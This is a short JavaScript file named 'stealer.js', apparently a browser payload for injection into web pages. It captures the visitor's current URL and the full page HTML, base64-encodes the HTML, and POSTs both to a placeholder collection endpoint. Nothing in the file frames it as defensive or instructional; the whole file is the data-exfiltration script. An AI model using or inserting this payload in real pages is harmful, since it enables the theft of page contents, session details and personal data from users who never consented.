// stealer.js
var xhrUrl = new XMLHttpRequest();
xhrUrl.onreadystatechange = function() {
  if (xhrUrl.readyState === XMLHttpRequest.DONE && xhrUrl.status === 200) {
    console.log(xhrUrl.responseText);
  }
};

var currentUrl = window.location.href;
xhrUrl.open("POST", "/my-server-url/currentUrl", true);
xhrUrl.setRequestHeader("Content-Type", "application/json");
xhrUrl.send(JSON.stringify({url: currentUrl}));

var xhrDom = new XMLHttpRequest();
xhrDom.onreadystatechange = function() {
  if (xhrDom.readyState === XMLHttpRequest.DONE && xhrDom.status === 200) {
    console.log(xhrDom.responseText);
  }
};

var pageHtml = document.documentElement.outerHTML;
var pageBase64 = btoa(pageHtml);
xhrDom.open("POST", "/my-server-url/dom", true);
xhrDom.setRequestHeader("Content-Type", "application/json");
xhrDom.send(JSON.stringify({dom: pageBase64}));
